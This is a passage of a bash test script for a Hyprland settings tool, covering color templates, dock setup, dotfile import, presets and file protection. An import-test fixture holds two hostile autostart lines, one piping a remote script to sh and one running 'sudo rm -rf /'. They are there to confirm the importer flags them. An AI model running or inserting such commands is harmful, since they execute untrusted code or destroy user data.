    "^r@V#hex^": "FF0000",
    "^r@V#rgb( )^": "255 0 0",
    "^r@V>darken(0.5)^": "#800000",
    "^r@V>lighten(0.5)#l^": "75",
    "^r@DM>ne#hex^": "DFCFBF",
    "^r@V>ttc^": "#FFFFFF",
    "^r@v>g(128)#rgb^": "255,128,0",
    "^r@color4^": "#" + roles["ACCENT"],
}
for tag, want in cases.items():
    got = W.render(tag, colors)
    if got != want:
        problems.append(f"ricemood {tag}: {got!r} ≠ {want!r}")
got = W.render("{{a}} {color4.strip} {background} {color1.rgb}", colors, "pywal")
bg = roles["BG"].lower()
if not got.startswith("{a} ") or f"#{bg}" not in got or roles["ACCENT"].lower() not in got:
    problems.append(f"pywal: {got!r}")
try:
    W.render("^r@Bogus^", colors)
    problems.append("unknown color raised no error")
except KeyError:
    pass

text, mapping = W.templatize("a #ff0000\nb &#123456;\nc #FF0000", {"RED": "#ee1111", "BG": "#000000"})
if text != "a ^r@RED^\nb &#123456;\nc ^r@RED^" or mapping != {"ff0000": "RED"}:
    problems.append(f"templatize: {text!r} {mapping}")

root = Path(".")
ids = [e.id for e in W.library(root)]
if not {"pywal", "zathura", "tmux"} <= set(ids):
    problems.append(f"bundled templates: {ids}")
home = Path(os.environ["HOME"])
(home / ".config/zathura").mkdir(parents=True)
(home / ".config/zathura/zathurarc").write_text("set font mono\n")
user_file = home / "app.conf"
user_file.write_text("fg=#ffffff\n")
W.add_user_template(user_file, {"FG": "#ffffff", "BG": "#000000"})
config = W.load_config()
config["enabled"] = ["pywal", "zathura"]
for _ in range(2):                      # twice: the include line must not be duplicated
    result = W.apply(root, colors, config, run_reload=False)
if result.errors:
    problems.append(f"apply errors: {result.errors}")
data = json.loads((home / ".cache/wal/colors.json").read_text())
if data["colors"]["color4"] != "#" + roles["ACCENT"].lower():
    problems.append(f"colors.json color4: {data['colors']['color4']}")
rc = (home / ".config/zathura/zathurarc").read_text()
if rc.count("include hyprsetup-colors") != 1 or "set font mono" not in rc:
    problems.append(f"zathurarc: {rc!r}")
if (home / ".config/tmux").exists():
    problems.append("disabled tmux template was written")
if user_file.read_text() != f"fg=#{roles['FG']}\n":
    problems.append(f"user template: {user_file.read_text()!r}")
if (home / "app.conf.hyprsetup-orig").read_text() != "fg=#ffffff\n":
    problems.append("the user file's original state was not kept")
print("\n".join(problems))
WCEOF
)
    # When a profile owns hypr/, our session startup commands
    # (window switcher, visualizer…) are carried into the overlay as a list.
    overlay_out=$(PYTHONPATH=python python3 - <<'OVEOF'
from hyprsetup import keybinds
layer = keybinds.rice_overlay("bind = SUPER, Q, killactive,", "conf",
                              ["~/.config/hypr/hyprsetup/scripts/windowswitch.py --preload",
                               "~/.config/hypr/hyprsetup/scripts/visualizer.sh start"])
if not all(f"exec-once = ~/.config/hypr/hyprsetup/scripts/{c}" in layer
           for c in ("windowswitch.py --preload", "visualizer.sh start")):
    print("overlay: startup command list not written")
OVEOF
)
    # Dock (nwg-dock-hyprland): autostart only when enabled, command line from
    # settings, style from the palette, "dock" action when the script/style changes.
    dock_out=$(PYTHONPATH=python python3 - <<'DOCKEOF'
from pathlib import Path
from hyprsetup import apply, keybinds, render, settings
from hyprsetup.catalog import Catalog

problems = []
base = {s.key: s.default for g in settings.GROUPS for s in g.settings}
def strip(path):
    return "\n".join(l for l in Path(path).read_text().splitlines() if not l.startswith("{{!"))
for lang, path in (("conf", "templates/hypr/autostart.conf.tmpl"),
                   ("lua", "templates/hypr-lua/hyprland/autostart.lua.tmpl")):
    on = render.render_text(strip(path), dict(base, DOCK_ENABLE="true", AUTOSTART_LINES=""))
    off = render.render_text(strip(path), dict(base, DOCK_ENABLE="false", AUTOSTART_LINES=""))
    if "dock.sh start" not in on or "dock.sh start" in off:
        problems.append(f"autostart ({lang}): on/off line wrong")
catalog = Catalog.load("config/components.json")
if catalog.component("dock") is None:
    problems.append("component 'dock' missing from catalog")
values = dict(base, THEME="nord", DOCK_ENABLE="true", DOCK_POSITION="left",
              DOCK_AUTOHIDE="true", DOCK_LAUNCHER="false", DOCK_MONITOR="DP-1",
              TERMINAL="kitty", LAUNCHER="fuzzel", FILEMANAGER="thunar", BROWSER="firefox")
out = render.derived_vars(values, catalog, ["kitty", "fuzzel", "thunar", "dock"])
script = render.render_text(strip("templates/hypr/scripts/dock.sh.tmpl"), out)
for want in ("-p left", "-ml 8", "-d", "-o DP-1", "-nolauncher",
             "PIN_CANDIDATES=(kitty firefox thunar)", 'PATTERN="^nwg-dock-hyprland'):
    if want not in script:
        problems.append(f"dock.sh: '{want}' missing")
if " -x" in script.split("ARGS=(")[1].split(")")[0]:
    problems.append("dock.sh: an autohiding dock must not reserve space (-x)")
css = render.render_text(strip("templates/nwg-dock-hyprland/style.css.tmpl"), out)
if f"rgba({out['RGB_BG']}, 0.85)" not in css or "{{" in css:
    problems.append("style.css: palette/opacity not written")
for rel in ("hypr/scripts/dock.sh", f"hypr/{keybinds.RICE_SCRIPTS}/dock.sh",
            "nwg-dock-hyprland/style.css"):
    if apply.action_for(rel) != "dock":
        problems.append(f"no action: {rel}")
print("\n".join(problems))
DOCKEOF
)
    if [[ -n "$dock_out" ]]; then
        fail "dock (nwg-dock-hyprland: autostart, command line, style, action)" "$dock_out"$'\n'
    else
        pass "dock (nwg-dock-hyprland: autostart, command line, style, action)"
    fi

    if [[ -n "$overlay_out" ]]; then
        fail "profile overlay: startup commands" "$overlay_out"$'\n'
    else
        pass "profile overlay: startup commands"
    fi

    if [[ -n "$wallcolors_out" ]]; then
        fail "wallpaper colors (ricemood/pywal templates)" "$wallcolors_out"$'\n'
    else
        pass "wallpaper colors (ricemood/pywal templates)"
    fi

    if [[ -n "$login_out" ]]; then
        fail "login screen (SDDM catalog/.user, Plasma Login)" "$login_out"$'\n'
    else
        pass "login screen (SDDM catalog/.user, Plasma Login)"
    fi

    # Import from a link (importer.py): with local fake repos, offline.
    imp_out=$(PYTHONPATH=python python3 - <<'IMPEOF'
import os, subprocess, tempfile
from pathlib import Path
problems = []
tmp = Path(tempfile.mkdtemp())
os.environ["HOME"] = str(tmp / "home")
os.environ["XDG_CACHE_HOME"] = str(tmp / "cache")
from hyprsetup import importer, rice

def repo(name, files):
    d = tmp / "src" / name
    for path, text in files.items():
        f = d / path
        f.parent.mkdir(parents=True, exist_ok=True)
        f.write_text(text)
    env = {**os.environ, "GIT_AUTHOR_NAME": "t", "GIT_AUTHOR_EMAIL": "t@t",
           "GIT_COMMITTER_NAME": "t", "GIT_COMMITTER_EMAIL": "t@t"}
    for cmd in (["init", "-q", "-b", "main"], ["add", "-A"], ["commit", "-qm", "x"]):
        subprocess.run(["git", *cmd], cwd=d, check=True, env=env, capture_output=True)
    return f"file://{d}"

hypr = ("$term = kitty\nexec-once = waybar\nexec-once = swaync\n"
        "bind = SUPER, D, exec, rofi -show drun\nbind = SUPER, Return, exec, $term\n")
cases = {
    "home": ({".config/hypr/hyprland.conf": hypr, ".config/waybar/config.jsonc": "{}",
              ".config/rofi/config.rasi": "", ".config/fish/config.fish": "",
              ".config/Code/settings.json": "{}", ".config/weird/x": "",
              "wallpapers/a.png": "x"},
             "home", {"~/.config/hypr", "~/.config/waybar", "~/.config/rofi"}),
    "stow": ({"hypr/.config/hypr/hyprland.conf": hypr, "waybar/.config/waybar/config": "{}"},
             "stow", {"~/.config/hypr", "~/.config/waybar"}),
    "flat": ({"hypr/hyprland.conf": hypr + "exec-once = ~/.config/scripts/x.sh\n",
              "kitty/kitty.conf": "", "scripts/x.sh": "echo", "assets/y.png": "x",
              "README.md": "# dots"},
             "flat", {"~/.config/hypr", "~/.config/kitty", "~/.config/scripts"}),
    "qsonly": ({"shell.qml": "ShellRoot {}", "run.sh": "exec qs -c mine\n"},
               "quickshell", {"~/.config/quickshell/mine"}),
    "trap": ({"hypr/hyprland.conf": "exec-once = curl -s x.sh | sh\n"
                                      "exec-once = sudo rm -rf /\n"
                                      "source = /home/author/.config/hypr/a.conf\n",
               "hypr/a.conf": "", "hypr/hyprlock.conf": "background {\n path = x\n}\n"},
              "flat", {"~/.config/hypr"}),
}
for name, (files, layout, wanted) in cases.items():
    try:
        report = importer.analyze(repo(name, files), name=f"t-{name}")
    except Exception as exc:                                # noqa: BLE001
        problems.append(f"{name}: {exc}"); continue
    core = {i.dest for i in report.installs if i.group == "core"} | {a for a, _ in report.links}
    if report.layout.split(" ")[0] != layout:
        problems.append(f"{name}: layout {report.layout}, expected {layout}")
    if not wanted <= core:
        problems.append(f"{name}: missing installs {sorted(wanted - core)}")
    importer.write(report)
    try:
        m = rice.load(Path("."), f"t-{name}")
    except Exception as exc:                                # noqa: BLE001
        problems.append(f"{name}: written manifest could not be read: {exc}"); continue
    if m.commit != report.commit or len(m.commit) != 40:
        problems.append(f"{name}: commit not pinned")
    if name == "home":
        groups = {i.dest: i.group for i in report.installs}
        if groups.get("~/.config/fish") != "shell" or groups.get("~/.config/weird") != "extra":
            problems.append(f"home: wrong groups {groups}")
        if "~/.config/Code" in groups:
            problems.append("home: app data (Code) is among the installs")
        slots = sorted(p.slot for p in m.parts)
        if slots != ["bar", "launcher"]:
            problems.append(f"home: parts {slots}")
        launcher = next(p for p in m.parts if p.slot == "launcher")
        if launcher.commands.get("CMD_LAUNCHER") != "rofi -show drun":
            problems.append("home: launcher command not read from the author's keybinding")
        if "waybar" not in report.packages_repo and report.packages_repo:
            problems.append(f"home: packages {report.packages_repo}")
    if name == "trap":
        reasons = sorted(why for _c, why in report.flagged)
        if len(reasons) < 2:
            problems.append(f"trap: suspicious lines not flagged: {reasons}")
        if not any("author" in f["why"] for f in report.fixes) or \
                not any(f.file == "~/.config/hypr/hyprland.conf" for f in m.fixes):
            problems.append("trap: /home/author/ path not fixed")
        if not any(p.slot == "lock" for p in m.parts):
            problems.append("trap: no hyprlock part produced")
    if name == "qsonly" and rice.all_profiles(Path(".")).count("t-qsonly") != 1:
        problems.append("imported profile missing from the list")
importer.remove("t-home")
if rice.is_rice(Path("."), "t-home"):
    problems.append("forget: manifest not deleted")
for bad in ("not a url", "ftp:/x"):
    try:
        importer.parse_url(bad)
        problems.append(f"invalid address accepted: {bad}")
    except ValueError:
        pass
src = importer.parse_url("https://github.com/a/b/tree/dev/dots")
if (src.owner, src.repo, src.ref, src.subdir) != ("a", "b", "dev", "dots"):
    problems.append(f"github address not parsed: {src}")
print("\n".join(problems))
IMPEOF
)
    if [[ -n "$imp_out" ]]; then
        fail "import from link (layouts, flagging, manifest)" "$imp_out"$'\n'
    else
        pass "import from link (layouts, flagging, manifest)"
    fi

    # The profile file's BAR (which program draws the bar) and the backend of
    # the bar preset it points to must match. If they drift, the template condition
    # ("BAR==<backend> && HAS_<backend>") does not hold and applying the profile
    # produces NO bar config at all — the user says "I applied the profile, the
    # bar didn't change", and no error appears.
    bad_backend=$(PYTHONPATH=python python3 - <<'BACKENDEOF'
from pathlib import Path

from hyprsetup import presets as P
from hyprsetup.catalog import Catalog

catalog = Catalog.load(Path("config/components.json"))
bar_ids = [c.id for cat in catalog.categories if cat.id == "bar"
           for c in cat.components]
default_backend = bar_ids[0] if bar_ids else "waybar"

problems = []
for path in sorted(Path("presets/profile").glob("*.conf")):
    # A profile (rice.py) brings its bar with the author's files; the BAR
    # choice describes this project's bar and is meaningless there.
    if (path.parent / f"{path.stem}.rice.toml").is_file():
        continue
    values = P.parse(path).values
    declared = values.get("BAR", "")
    if not declared:
        problems.append(f"{path.name}: no BAR — the file does not say which bar "
                        f"program it comes with")
        continue
    if declared not in bar_ids:
        problems.append(f"{path.name}: BAR={declared} is not a bar component in the catalog")
        continue
    bar_name = values.get("BAR_PRESET", "")
    chain = P.resolve_chain(Path("."), profile=path.stem)
    resolved = chain.get("BAR", "") or default_backend
    if resolved != declared:
        problems.append(f"{path.name}: BAR={declared} but preset '{bar_name}' "
                        f"draws {resolved}")
print("\n".join(problems))
BACKENDEOF
)
    if [[ -n "$bad_backend" ]]; then
        fail "profile ↔ bar backend consistent" "$bad_backend"$'\n'
    else
        pass "profile ↔ bar backend consistent"
    fi

    # Every name in BAR_STYLES must have its own block in the template and every
    # block must correspond to a bar preset. If a flag is added without a block,
    # the preset differs only in BAR_* numbers (doesn't look like its source); if a
    # block is written without a flag it is never generated and nobody notices.
    bad_styles=$(PYTHONPATH=python python3 - <<'STYLEEOF'
import re
from pathlib import Path

from hyprsetup import render

templates = [Path("templates/waybar/style.css.tmpl"),
             Path("templates/waybar/config.jsonc.tmpl"),
             Path("templates/quickshell/shell.qml.tmpl")]
text = "\n".join(path.read_text(encoding="utf-8") for path in templates)
used = set(re.findall(r"\{\{#(?:if|unless)\s+BAR_IS_([A-Z0-9_]+)\s*\}\}", text))
presets = {path.stem for path in Path("presets/bar").glob("*.conf")}

problems = []
for name in render.BAR_STYLES:
    flag = name.upper().replace("-", "_")
    if flag not in used:
        problems.append(f"{name}: in BAR_STYLES but no "
                        f"{{{{#if BAR_IS_{flag}}}}} block in the template")
    if name not in presets:
        problems.append(f"{name}: in BAR_STYLES but presets/bar/{name}.conf missing")

known = {n.upper().replace("-", "_") for n in render.BAR_STYLES}
for flag in sorted(used - known - {"VERTICAL"}):
    problems.append(f"BAR_IS_{flag}: block in the template but not in BAR_STYLES — "
                    f"never generated")
print("\n".join(problems))
STYLEEOF
)
    if [[ -n "$bad_styles" ]]; then
        fail "bar preset template blocks in place" "$bad_styles"$'\n'
    else
        pass "bar preset template blocks in place"
    fi

    # The preview on the gallery card must also TELL PRESETS APART. If the card
    # only draws the BAR_* numbers (the old behavior), a capsule preset and a
    # bare-text preset look like the same row of gray boxes and the user only
    # finds out which is which by applying it. The shape table (preview.
    # BAR_PREVIEW_SHAPES) is the preview-side summary of the CSS blocks in the
    # template; here we check that the two have not drifted apart.
    # preview.py needs GTK4; without GTK this check is skipped, otherwise
    # set -e would abort the whole script here.
    if ! python3 -c "
import gi
gi.require_version('Gtk', '4.0'); gi.require_version('Adw', '1')
from gi.repository import Gtk, Adw" >/dev/null 2>&1; then
        skip "gallery previews tell presets apart" "no GTK4/libadwaita"
    else
    bad_preview=$(PYTHONPATH=python python3 - <<'PREVIEWEOF'
from pathlib import Path

import gi

gi.require_version("Gtk", "4.0")
gi.require_version("Adw", "1")

from hyprsetup import render
from hyprsetup.gui.preview import BAR_PREVIEW_SHAPES

presets = {path.stem for path in Path("presets/bar").glob("*.conf")}
valid_shapes = {"chip", "pill", "bare", "underline", "divider", "island",
                "capsule", "outline", "bracket"}
problems = [f"{name}: in the preview table but presets/bar/{name}.conf missing"
            for name in BAR_PREVIEW_SHAPES if name not in presets]
problems += [f"{name}: unknown shape {options.get('shape')!r}"
             for name, options in BAR_PREVIEW_SHAPES.items()
             if options.get("shape", "chip") not in valid_shapes]

# Every preset with its own CSS/QML block in the template must have a
# counterpart in the preview too; otherwise the card looks like "nothing special".
for name in render.BAR_STYLES:
    if name not in BAR_PREVIEW_SHAPES:
        problems.append(f"{name}: has its own block in the template but no shape "
                        f"defined in the gallery preview")
print("\n".join(problems))
PREVIEWEOF
)
    if [[ -n "$bad_preview" ]]; then
        fail "gallery previews tell presets apart" "$bad_preview"$'\n'
    else
        pass "gallery previews tell presets apart"
    fi
    fi

    # install.sh --version and the Python package version must match;
    # self-update and --doctor show both.
    sh_ver=$(sed -n 's/^HYPRSETUP_VERSION="\(.*\)"$/\1/p' install.sh)
    py_ver=$(sed -n 's/^__version__ = "\(.*\)"$/\1/p' python/hyprsetup/__init__.py)
    if [[ -n "$sh_ver" && "$sh_ver" == "$py_ver" ]]; then
        pass "version number consistent ($sh_ver)"
    else
        fail "version number consistent" "install.sh=$sh_ver python=$py_ver"$'\n'
    fi

    # In the variables the settings app passes to templates, single-choice
    # category variables (BAR/TERMINAL/LAUNCHER…) must be filled FROM THE SELECTION.
    # They used not to be: the "require: BAR==waybar" condition never held, so the
    # app did not generate waybar/hyprpanel/quickshell/wayle configs.
    bad_primary=$(PYTHONPATH=python python3 - <<'PRIMARYEOF'
from pathlib import Path

from hyprsetup import keybinds as kb
from hyprsetup.apply import Applier
from hyprsetup.catalog import Catalog
from hyprsetup.gui.state import SetupState

root = Path(".").resolve()
catalog = Catalog.load(root / "config/components.json")
state = SetupState(catalog)
applier = Applier(root, catalog, kb.Keybinds())
variables, _skipped = applier.export_vars(state.values, sorted(state.selected))

problems = []
for category in catalog.categories:
    if not category.var:
        continue
    chosen = next((c.id for c in category.components if c.id in state.selected), "")
    if not chosen:
        continue
    if variables.get(category.var) != chosen:
        problems.append(f"{category.var}: {variables.get(category.var)!r} goes to the "
                        f"template, selected component is {chosen!r}")

# HYPR_LANG="auto" cannot go to templates AS IS: the hypr templates' condition
# checks equality ("HYPR_LANG==conf"), "auto" matches neither and NO Hyprland
# config is generated — window borders/shadows keep the old colors while
# waybar/kitty/GTK refresh. install.sh resolves this at install start
# (lib/preflight.sh); the app must resolve it on every pass too.
for given in ("auto", "", "conf", "lua"):
    state.values["HYPR_LANG"] = given
    resolved, _skipped = applier.export_vars(state.values, sorted(state.selected))
    if resolved.get("HYPR_LANG") not in ("conf", "lua"):
        problems.append(f"HYPR_LANG={given!r} → {resolved.get('HYPR_LANG')!r} "
                        f"(must be conf/lua)")
    if given in ("conf", "lua") and resolved.get("HYPR_LANG") != given:
        problems.append(f"HYPR_LANG={given!r} was set explicitly but "
                        f"{resolved.get('HYPR_LANG')!r} was generated")
state.values["HYPR_LANG"] = "auto"

print("\n".join(problems))
PRIMARYEOF
)
    if [[ -n "$bad_primary" ]]; then
        fail "template variables derive from the selection" "$bad_primary"$'\n'
    else
        pass "template variables derive from the selection"
    fi

    # apply.py's file->action table is everything the settings app knows about
    # "I wrote this file, what must I do for it to change on screen".
    # An unmapped template target = a setting that is silently not applied:
    # the user moves the slider, the file is written to disk, but nothing
    # changes because the relevant daemon is never reloaded. When a new
    # template is added, this test catches it.
    unmapped=$(PYTHONPATH=python python3 - <<'PYEOF'
import re
from pathlib import Path
from hyprsetup.apply import action_for

missing = []
for tmpl in sorted(Path("templates").rglob("*.tmpl")):
    text = tmpl.read_text(encoding="utf-8")
    match = re.search(r"\{\{!\s*target:\s*(.+?)\s*\}\}", text)
    rel = match.group(1) if match else str(tmpl.relative_to("templates"))[:-len(".tmpl")]
    if action_for(rel) is None:
        missing.append(f"{rel}  ({tmpl})")
print("\n".join(missing))
PYEOF
)
    if [[ -n "$unmapped" ]]; then
        fail "every template target maps to an action in apply.py" "$unmapped"$'\n'
    else
        pass "every template target maps to an action in apply.py"
    fi

    # The settings app must NOT REWRITE an unchanged file. If it did, every
    # apply pass would produce a reason to restart the relevant daemon and an
    # "apply -> daemon restarts -> apply" loop would form. It also verifies here
    # that a single setting touches only the relevant file.
    apply_out=$(PYTHONPATH=python python3 - "$TMP_ROOT" <<'PYEOF'
import sys
from pathlib import Path
from hyprsetup.apply import Applier
from hyprsetup.catalog import Catalog
from hyprsetup import keybinds as keybinds_mod, settings as schema

home = Path(sys.argv[1]) / "apply-home"
home.mkdir(parents=True, exist_ok=True)
catalog = Catalog.load("config/components.json")
values = dict(schema.defaults())
values.update({"THEME": "tokyo-night", "COLOR_SCHEME": "dark",
               "TERMINAL": "kitty", "LAUNCHER": "wofi", "BAR": "waybar",
               "NOTIFIER": "mako", "WALLPAPER_DAEMON": "hyprpaper",
               "CURSOR_THEME": "Bibata-Modern-Ice", "CURSOR_SIZE": "24",
               "FONT_FAMILY": "Noto Sans", "FONT_SIZE": "11",
               "MOD_KEY": "SUPER", "MONITOR_SPEC": ",preferred,auto,1",
               "MANAGE_HYPR_CONFIGS": "1", "MANAGE_MONITORS": "1"})
selected = catalog.profile("minimal")

applier = Applier(Path("."), catalog,
                  keybinds_mod.Keybinds.load("config/keybinds.json"),
                  config_home=home)
applier._run_action = lambda *a, **k: None   # don't touch daemons
problems = []

first = applier.apply(values, selected)
if first.errors:
    problems.append(f"first apply errored: {first.errors}")
if not first.written:
    problems.append("first apply wrote no files")

again = applier.apply(values, selected)
if again.written:
    problems.append(f"with unchanged settings {len(again.written)} files were "
                    f"rewritten: {again.written[:5]}")

values["GAPS_IN"] = str(int(values.get("GAPS_IN", "5")) + 7)
single = applier.apply(values, selected)
expected_hypr = ("hypr/hyprland.lua"
                 if applier.resolve_hypr_lang(values.get("HYPR_LANG", "")) == "lua"
                 else "hypr/hyprland.conf")
if single.written != [expected_hypr]:
    problems.append(f"GAPS_IN should have changed a single file, changed: {single.written}")
print("\n".join(problems))
PYEOF
)
    if [[ -n "$apply_out" ]]; then
        fail "settings app writes only what changed" "$apply_out"$'\n'
    else
        pass "settings app writes only what changed"
    fi

    # monitors.conf/workspaces.conf generated by nwg-displays must NOT BE TOUCHED.
    # Otherwise someone who set up their display layout with that tool lost it
    # entirely as soon as they changed any setting here (even a slider) — the
    # default MANAGE_MONITORS=1 regenerates the file with placeholder
    # content.
    nwg_out=$(PYTHONPATH=python python3 - "$TMP_ROOT" <<'NWGEOF'
import sys
from pathlib import Path

from hyprsetup import keybinds as keybinds_mod, settings as schema
from hyprsetup.apply import Applier
from hyprsetup.catalog import Catalog

catalog = Catalog.load("config/components.json")
keybinds = keybinds_mod.Keybinds.load("config/keybinds.json")
selected = catalog.profile("minimal")
problems = []

NWG_MONITORS = ("# Generated by nwg-displays on 2026-09-23 at 10:50:44. "
                "Do not edit manually.\n\n"
                "monitor=DP-1,1920x1080@180.0,0x0,1.0,vrr,1\n")
NWG_WORKSPACES = ("# Generated by nwg-displays on 2026-09-23 at 10:50:44. "
                  "Do not edit manually.\n\n"
                  "workspace=1,monitor:DP-1,default:true\n")


def run(lang, extra_values):
    home = Path(sys.argv[1]) / f"nwg-home-{lang}"
    (home / "hypr" / "hyprland").mkdir(parents=True, exist_ok=True)
    values = dict(schema.defaults())
    values.update({
        "THEME": "tokyo-night", "COLOR_SCHEME": "dark", "TERMINAL": "kitty",
        "LAUNCHER": "wofi", "BAR": "waybar", "NOTIFIER": "mako",
        "WALLPAPER_DAEMON": "hyprpaper", "CURSOR_THEME": "Bibata-Modern-Ice",
        "CURSOR_SIZE": "24", "FONT_FAMILY": "Noto Sans", "FONT_SIZE": "11",
        "MOD_KEY": "SUPER", "MONITOR_SPEC": ",preferred,auto,1",
        "MANAGE_HYPR_CONFIGS": "1", "MANAGE_MONITORS": "1",
        "WORKSPACE_MONITOR_MAP": "1:DP-1:default", "HYPR_LANG": lang})
    values.update(extra_values)
    applier = Applier(Path("."), catalog, keybinds, config_home=home)
    applier._run_action = lambda *a, **k: None
    return home, values, applier


# --- conf mode: the files must NOT be generated at all --------------------
home, values, applier = run("conf", {})
(home / "hypr/monitors.conf").write_text(NWG_MONITORS)
(home / "hypr/workspaces.conf").write_text(NWG_WORKSPACES)
result = applier.apply(values, selected)
if (home / "hypr/monitors.conf").read_text() != NWG_MONITORS:
    problems.append("monitors.conf was overwritten")
if (home / "hypr/workspaces.conf").read_text() != NWG_WORKSPACES:
    problems.append("workspaces.conf was overwritten")
if "hypr/hyprland.conf" not in result.written:
    problems.append("other files were not written either (protection too broad)")

# If the user explicitly says "you manage it", ownership must be reclaimable.
if applier.release_foreign("hypr/monitors.conf") != "nwg-displays":
    problems.append("release_foreign did not reclaim ownership")
again = applier.apply(values, selected)
if "hypr/monitors.conf" not in again.written:
    problems.append("monitors.conf not generated after ownership was reclaimed")

# --- lua mode: the file is kept BUT the require line must stay -----------
home, values, applier = run("lua", {})
foreign_lua = "-- Generated by some-tool on 2026-09-23.\n"
(home / "hypr/hyprland/monitors.lua").write_text(foreign_lua)
result = applier.apply(values, selected)
if (home / "hypr/hyprland/monitors.lua").read_text() != foreign_lua:
    problems.append("monitors.lua was overwritten")
if result.protected.get("hypr/hyprland/monitors.lua") != "some-tool":
    problems.append(f"protected file not reported: {result.protected}")
entry = (home / "hypr/hyprland.lua").read_text()
if 'require("hyprland.monitors")' not in entry:
    problems.append("require line lost in lua mode — the foreign file is never read")

print("\n".join(problems))
NWGEOF
)
    if [[ -n "$nwg_out" ]]; then
        fail "nwg-displays display files are preserved" "$nwg_out"$'\n'
    else
        pass "nwg-displays display files are preserved"
    fi

    # The ownership rule is written separately in two places (bash install path +
    # python settings app). If they diverge, one protects while the other
    # overwrites; this test compares both on the same inputs.
    owner_bad=""
    owner_dir="$TMP_ROOT/owner-samples"
    mkdir -p "$owner_dir"
    printf '# Generated by nwg-displays on 2026-09-23 at 10:50:44. Do not edit manually.\n' >"$owner_dir/nwg"
    printf '# hyprsetup:managed\nmonitor = ,preferred,auto,1\n' >"$owner_dir/ours"
    printf '/* Generated by hyprsetup. */\n' >"$owner_dir/ours-legacy"
    printf 'monitor = DP-1,preferred,auto,1\n' >"$owner_dir/plain"
    printf -- '-- Generated by some-tool on 2026-09-23.\n' >"$owner_dir/other"
    # lib/core.sh is not loaded in this group (it is loaded in the render group);
    # run the rule in its own shell.
    bash_owner_of() {
        bash -c 'source lib/core.sh; foreign_config_owner "$1"' _ "$1" 2>/dev/null
    }
    for sample in "$owner_dir"/*; do
        bash_owner=$(bash_owner_of "$sample")
        py_owner=$(PYTHONPATH=python python3 -c '
import sys
from pathlib import Path
from hyprsetup.apply import foreign_owner
print(foreign_owner(Path(sys.argv[1])) or "")' "$sample")
        [[ "$bash_owner" == "$py_owner" ]] || \
            owner_bad+="$(basename "$sample"): bash='$bash_owner' python='$py_owner'"$'\n'
    done
    # Expected results (the rule itself must be verified too, not just agreement)
    [[ "$(bash_owner_of "$owner_dir/nwg")" == "nwg-displays" ]] || \
        owner_bad+="nwg-displays not recognized"$'\n'
    [[ -z "$(bash_owner_of "$owner_dir/ours")" ]] || \
        owner_bad+="file carrying our own marker counted as foreign"$'\n'
    [[ -z "$(bash_owner_of "$owner_dir/ours-legacy")" ]] || \
        owner_bad+="'Generated by hyprsetup' counted as foreign"$'\n'
    [[ -z "$(bash_owner_of "$owner_dir/plain")" ]] || \
        owner_bad+="plain unmarked file counted as foreign"$'\n'
    if [[ -n "$owner_bad" ]]; then
        fail "foreign file ownership rule same in bash and python" "$owner_bad"
    else
        pass "foreign file ownership rule same in bash and python"
    fi

    # Applying a profile must carry COLOR EVERYWHERE. There were three separate
    # break points and all three were silent:
    #   1. Wallpaper: if the profile's WALLPAPER_IMAGE is not copied, the desktop
    #      keeps the old image (install.sh does it with wallpaper_step; the
    #      settings app had no equivalent).
    #   2. THEME="auto": the palette is extracted from the wallpaper; if the file
    #      is not in place extraction fails and colors fall back to the DEFAULT palette.
    #   3. Firefox: userChrome.css is generated in ~/.config but Firefox wants it
    #      in its profile's chrome/ directory.
    color_out=$(PYTHONPATH=python python3 - "$TMP_ROOT" <<'COLOREOF'
import re
import sys
from pathlib import Path

from hyprsetup import keybinds as keybinds_mod, presets as P, themes
from hyprsetup.apply import Applier
from hyprsetup.catalog import Catalog

sandbox = Path(sys.argv[1]) / "color-home"
config_home = sandbox / ".config"
config_home.mkdir(parents=True, exist_ok=True)
catalog = Catalog.load("config/components.json")
keybinds = keybinds_mod.Keybinds.load("config/keybinds.json")
problems = []


def applier(dry_run=False):
    instance = Applier(Path("."), catalog, keybinds,
                       config_home=config_home, dry_run=dry_run)
    # Only steps that touch a DAEMON are silenced; file-writing actions
    # (Firefox theme, KDE color scheme) must run — they are exactly what
    # the test measures.
    for name in ("_hyprctl", "_restart_bar", "_restart_primary",
                 "_apply_gsettings", "_apply_cursor",
                 "_install_kde_color_scheme", "_restart_open_kde_qt_apps"):
        setattr(instance, name, lambda *a, **k: None)
    # Components count as installed: on a machine with pacman (CI container),
    # if waybar/kitty are not installed the Applier never generates their files
    # and the test would depend on the machine's packages.
    instance.component_installed = lambda *a, **k: True
    return instance


# The test measures the propagation mechanism, not profile CONTENTS; so it
# does not depend on the files under presets/profile/ (the directory may be
# empty while the profile set is rewritten). Values come from the archived profiles:
# docs/archive/profiles-v2/.
SAMPLE_PROFILES = {
    "gruvbox-material": {"THEME": "gruvbox-dark",
                         "WALLPAPER_IMAGE": "wallpapers/gruvbox-dark.png"},
    "hyde": {"THEME": "auto",
             "WALLPAPER_IMAGE": "wallpapers/catppuccin-mocha.png"},
    "rose-pine-soft": {"THEME": "rose-pine",
                       "WALLPAPER_IMAGE": "wallpapers/rose-pine.png"},
}

def values_for(profile):
    values = dict(P.resolve_chain(Path("."), profile=""))
    values.update(SAMPLE_PROFILES[profile])
    values.setdefault("MANAGE_HYPR_CONFIGS", "1")
    values.setdefault("MONITOR_SPEC", ",preferred,auto,1")
    return values

selected = catalog.profile("standard")

# 1. --dry-run must not touch any file
applier(dry_run=True).apply(values_for("gruvbox-material"), selected)
wallpaper = sandbox / "Pictures/wallpapers/wallpaper.png"
if wallpaper.exists():
    problems.append("--dry-run wrote the wallpaper")

# 2. Applying a profile must put the wallpaper in place
run = applier()
run.apply(values_for("gruvbox-material"), selected)
if not wallpaper.is_file():
    problems.append("profile applied but the wallpaper was not copied")
else:
    source = Path("wallpapers/gruvbox-dark.png")
    if source.is_file() and wallpaper.read_bytes() != source.read_bytes():
        problems.append("the wallpaper is not the profile's image")

# 3. Colors must reach the generated files (hex or KDE's decimal)
hypr_rel = "hypr/hyprland.lua" if run.resolve_hypr_lang("auto") == "lua" else "hypr/hyprland.conf"
palette = themes.resolve("gruvbox-dark")
bg, accent = palette["BG"][:6].lower(), palette["ACCENT"][:6].lower()
decimal = ",".join(str(int(bg[i:i + 2], 16)) for i in (0, 2, 4))
for rel in (hypr_rel, "waybar/style.css", "kitty/kitty.conf",
            "gtk-3.0/gtk.css", "kdeglobals"):
    path = config_home / rel
    if not path.is_file():
        problems.append(f"{rel} not generated")
        continue
    text = path.read_text(errors="ignore").lower()
    if bg not in text and accent not in text and decimal not in text:
        problems.append(f"{rel} does not carry the new palette")

# 3b. With HYPR_LANG="auto" the Hyprland config must be generated too
